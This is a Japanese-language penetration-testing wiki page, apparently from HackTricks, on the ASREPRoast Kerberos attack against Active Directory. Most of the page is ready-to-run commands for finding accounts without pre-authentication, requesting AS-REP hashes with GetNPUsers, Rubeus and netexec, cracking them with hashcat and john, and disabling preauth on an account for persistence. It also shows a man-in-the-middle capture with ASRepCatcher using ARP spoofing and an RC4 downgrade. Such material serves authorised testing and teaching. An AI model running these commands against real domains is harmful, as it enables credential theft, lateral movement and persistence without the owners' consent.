# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoastは、**Kerberos pre-authentication required attribute**を持たないユーザーを悪用するセキュリティ攻撃です。具体的には、この脆弱性により攻撃者はユーザーのpasswordを知らなくてもDomain Controller (DC)に対してそのユーザーの認証を要求できます。DCはユーザーのpasswordから派生したキーで暗号化されたメッセージを返し、攻撃者はそれをofflineでクラックしてユーザーのpasswordを見つけようとします。

主な前提条件は以下のとおりです:

- **Lack of Kerberos pre-authentication**: ターゲットユーザーはこのセキュリティ機能を有効にしていない必要があります。
- **Connection to the Domain Controller (DC)**: 攻撃者はリクエストを送信し暗号化されたメッセージを受信するためにDCへのアクセスが必要です。
- **Optional domain account**: domain accountを持っていると、LDAPクエリで脆弱なユーザーをより効率的に特定できます。そうしたアカウントがない場合、攻撃者はユーザー名を推測する必要があります。

#### 脆弱なユーザーの列挙 (need domain credentials)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### AS_REP メッセージを要求する
```bash:Using Linux
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> AS-REP Roasting with Rubeus は暗号化タイプ0x17、preauthタイプ0の4768を生成します。

#### Quick one-liners (Linux)

- まず潜在的なターゲットを列挙します（例: leaked build paths から）Kerberos userenum で: `kerbrute userenum users.txt -d domain --dc dc.domain`
- 単一ユーザーの AS-REP を空のパスワードでも取得するには `netexec ldap <dc> -u svc_scan -p '' --asreproast out.asreproast` を使用します（netexec は LDAP signing/channel binding posture も表示します）。
- `hashcat out.asreproast /path/rockyou.txt` でクラックします — AS-REP roast ハッシュに対して **-m 18200** (etype 23) を自動検出します。

### クラック
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Persistence

あなたが **GenericAll** 権限（またはプロパティを書き込む権限）を持つユーザーに対して、Force **preauth** を不要にする:
```bash:Using Windows
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
```
## ASREProast 資格情報なし

攻撃者は man-in-the-middle の位置を利用して、Kerberos pre-authentication が無効化されていることに依存せずにネットワークを横断する AS-REP パケットを捕獲できます。したがって、VLAN 上のすべてのユーザーに対して機能します.\
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) を使うことでこれが可能です。さらに、このツールは Kerberos のネゴシエーションを改変してクライアントワークステーションに RC4 を使用させます。
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## 参考文献

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

---

{{#include ../../banners/hacktricks-training.md}}
